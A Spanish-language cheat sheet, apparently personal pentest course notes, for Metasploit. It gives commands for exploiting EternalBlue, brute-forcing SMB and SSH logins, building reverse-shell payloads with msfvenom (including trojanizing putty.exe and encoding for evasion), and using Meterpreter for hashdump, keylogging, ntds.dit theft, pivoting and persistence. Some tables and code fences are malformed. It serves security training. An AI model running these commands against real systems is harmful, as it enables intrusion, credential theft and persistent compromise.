# Metasploit Framework

> [!info] Herramienta
> Framework de explotación más completo: exploits, payloads, Meterpreter, post-explotación y evasión.

## Inicio y Consola

> [!tip] msfconsole
> La interfaz principal de Metasploit.

```bash

# Iniciar consola
msfconsole

# Sin banner
msfconsole -q

# Ejecutar resource script
msfconsole -r setup.rc

# Inicializar base de datos
msfdb init
msfdb status

# Verificar conexión DB
db_status

# Ayuda
help
?

# Salir
exit
| ```
## Búsqueda de Módulos

> [!important] Encontrar exploits
> Buscar por nombre, CVE, plataforma o tipo.

```bash

# Búsqueda básica
search eternalblue

# Filtrar por tipo y plataforma
search type:exploit platform:windows

# Por nombre
search name:smb

# Por CVE
search cve:2021

# Auxiliares
search type:auxiliary

# Info de módulo
info exploit/windows/smb/ms17_010_eternalblue
```

### Filtros de Búsqueda

| Filtro | Descripción |
|--------|-------------|
| `type:` | exploit, auxiliary, payload, post, encoder |
| `platform:` | windows, linux, android, osx |
| `name:` | Nombre del módulo |
| `port:` | Puerto |
| `rank:` | great, good, normal |
| `date:` | Rango de fechas |
| | `author:` | Autor |
|----------------------------------|------------------------|
## Workspaces

> [!note] Organización
> Separar proyectos/engagements.

```bash

# Listar workspaces
workspace

# Crear workspace
workspace -a cliente_a

# Cambiar workspace
workspace cliente_a

# Renombrar
workspace -r temp production

# Eliminar
workspace -d cliente_a

# Eliminar todos
workspace -D
```

---

## Exploits — Selección

| Comando | Descripción |
|---------|-------------|
| `use <módulo>` | Cargar módulo |
| `use <número>` | Cargar por índice de search |
| `back` | Salir del módulo |
| `show targets` | Objetivos compatibles |
| `run` / `exploit` | Ejecutar |
| `recheck` | Re-verificar vulnerabilidad |

```bash
# Cargar exploit
use exploit/windows/smb/ms17_010_eternalblue

# O por número
search eternalblue
use 0

# Ejecutar
exploit

# Ejecutar como job en background
exploit -j
| ```
## Exploits — Opciones

> [!warning] Configuración
> Configurar opciones antes de ejecutar.

| Comando | Descripción |

| `show options` | Ver opciones del módulo |
| `set <OPCIÃ“N> <valor>` | Configurar opción |
| `setg <OPCIÃ“N> <valor>` | Configurar global |
| `unset <OPCIÃ“N>` | Limpiar opción |
| `unsetg <OPCIÃ“N>` | Limpiar global |
| `set PAYLOAD <payload>` | Seleccionar payload |

```bash
# Ver opciones
show options

# Configurar target
set RHOSTS 192.168.1.100
set RPORT 445

# Configurar listener
set LHOST 192.168.1.50
set LPORT 4444

# Configurar payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Opción global
setg LHOST 192.168.1.50
| ```
## Módulos Auxiliares

> [!note] Escaneo y enumeración
> No explotan, pero sirven para reconocimiento.

```bash

# Port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# Directorios web
use auxiliary/scanner/http/dir_scanner
set RHOSTS target
set THREADS 10
run

# SMB login brute
use auxiliary/scanner/smb/smb_login
set USER_FILE users.txt
set PASS_FILE pass.txt
run

# SSH login brute
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target
set STOP_ON_SUCCESS true
run
```

---

## Payloads

> [!important] Tipos
| Tipo | Descripción |
|------|-------------|
| `reverse_tcp` | Conexión de vuelta al atacante (requiere LHOST/LPORT) |
| `bind_tcp` | Abre puerto en target (requiere RHOST/RPORT) |
| `meterpreter` | Shell avanzada in-memory |
| `shell` | Shell básica del sistema |

### Staged vs Stageless

| Tipo | Ejemplo | Descripción |
|------|---------|-------------|
| Staged | `reverse_tcp` (con `/`) | Envía stager mínimo, descarga payload completo |
| Stageless | `reverse_tcp` (con `_`) | Payload completo en un solo binario |

```bash
# Listar payloads compatibles
show payloads

# Seleccionar
set PAYLOAD windows/x64/meterpreter/reverse_tcp
| ```
## msfvenom — Generación de Payloads

> [!danger] Generar payloads
> Fuera de msfconsole, pero la sesión se recibe en msfconsole.

```bash

# Generar ejecutable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Listar formatos
msfvenom -l formats

# Listar payloads
msfvenom -l payloads

# Con encoding
msfvenom -p ... -e x86/shikata_ga_nai -i 5

# Inyectar en binario legítimo
msfvenom -p ... -x putty.exe -k -f exe -o payload.exe
| ```
## Meterpreter — Comandos Básicos

> [!tip] Shell avanzada
> In-memory, no escribe en disco.

| Comando | Descripción |

| `help` | Mostrar comandos |
| `sysinfo` | Info del sistema |
| `getuid` | Usuario actual |
| `getsystem` | Escalar a SYSTEM |
| `background` / `bg` | Envía a segundo plano |
| `shell` | Shell del sistema |

```bash
# Info del sistema
sysinfo

# Usuario actual
getuid

# Escalar privilegios
getsystem

# Shell del sistema
shell
exit # vuelve a meterpreter
```

---

## Meterpreter — Archivos

| Comando | Descripción |
|---------|-------------|
| `ls` / `pwd` / `cd` | Navegación |
| `upload <local> <remoto>` | Subir archivo |
| `download <remoto> <local>` | Descargar archivo |
| `search -f <patrón>` | Buscar archivos |
| `cat <archivo>` | Ver contenido |
| `rm` / `mkdir` / `edit` | Gestionar archivos |

```bash
# Subir herramienta
upload /tmp/mimikatz.exe C:\Windows\Temp\

# Descargar hash
download C:\Windows\NTDS\ntds.dit /tmp/

# Buscar archivos
search -f *.txt
search -f password*
```

---

## Meterpreter — Sistema

| Comando | Descripción |
|---------|-------------|
| `ps` | Listar procesos |
| `migrate <PID>` | Migrar a proceso |
| `hashdump` | Extraer hashes NTLM |
| `keyscan_start` | Iniciar keylogger |
| `keyscan_dump` | Ver teclas capturadas |
| `screenshot` | Capturar pantalla |

```bash
# Listar procesos
ps

# Migrar a explorer.exe
migrate 1234

# Extraer hashes
hashdump

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop
```

---

## Meterpreter — Red

| Comando | Descripción |
|---------|-------------|
| `ipconfig` / `ifconfig` | Interfaces de red |
| `portfwd add -l <local> -p <remoto> -r <target>` | Port forwarding |
| `route add <subred> <máscara> <sesión>` | Ruta para pivoting || `autoroute -s <subred>` | Auto-ruta |
| `arp` / `netstat` | Tabla ARP/conexiones |

```bash
# Port forwarding (acceso a RDP interno)
portfwd add -l 3389 -p 3389 -r 192.168.1.100

# Pivoting
route add 192.168.2.0 255.255.255.0 1
autoroute -s 192.168.1.0/24
```

---

## Base de Datos

| Comando | Descripción |
|---------|-------------|
| `db_nmap <opciones> <target>` | Nmap con guardado automático |
| `hosts` | Hosts descubiertos |
| `services` | Servicios descubiertos |
| `vulns` | Vulnerabilidades |
| `notes` | Notas |
| `creds` | Credenciales |

```bash
# Escaneo con guardado
db_nmap -sV -O 192.168.1.0/24

# Ver hosts
hosts

# Ver servicios
services -p 445
```

---

## Evasión

| Comando | Descripción |
|---------|-------------|
| `show encoders` | Listar encoders |
| `set EnableStageEncoding true` | Encoding automático |
| `set EXITFUNC thread` | Salida segura |

```bash
# Con encoding
msfvenom -p ... -e x64/xor -i 3

# Encoding de stager
set EnableStageEncoding true
set StageEncoder x64/xor
```

---

## Post-Explotación

```bash
# Detectar VM
run post/windows/gather/checkvm

# Enumerar usuarios logueados
run post/windows/gather/enum_logged_on_users

# Sugerir exploits locales
run post/multi/recon/local_exploit_suggester

# Habilitar RDP
run post/windows/manage/enable_rdp

# Cargar Kiwi (Mimikatz)
load kiwi
creds_all
kerberos_ticket_list

# Persistencia
run post/windows/manage/persistence_exe
```

---

#checklist
- [ ] msfconsole iniciado y DB conectada
- [ ] Módulos buscados con `search`
- [ ] Exploit configurado con `set RHOSTS/RPORT/LHOST/LPORT`
- [ ] Payload seleccionado y compatible
- [ ] msfvenom para generar payloads standalone
- [ ] Meterpreter: sysinfo, getuid, hashdump
- [ ] Pivoting con autoroute y portfwd
- [ ] Post-explotación con módulos post/

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../apuntes evolve/BLOQUE 15.md|BLOQUE 15]— Metasploit, Post-Explotación, SSH
- [[../informes/Informe_Banco.md|Informe_Banco]— Post-Explotación, Redes, SSH
- [[../apuntes Chema/Wireshark.md|Wireshark]— Post-Explotación, Redes, SSH
- [[../Apuntes/06 - Explotacion y Post-Explotacion/Metodología de Explotación.md|Metodología de Explotación]— Pivoting / Movilidad Lateral, Redes, SSH
- [[../Apuntes/09 - Pivoting y Movilidad Lateral/Pivoting y Movilidad Lateral.md|Pivoting y Movilidad Lateral]— Post-Explotación, Redes, SSH
- [[../apuntes evolve/BLOQUE 7.md|BLOQUE 7]— Pivoting / Movilidad Lateral, Redes, SSH

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

> #linux #metasploit #nmap #pivoting #post-explotacion #redes #ssh #windows
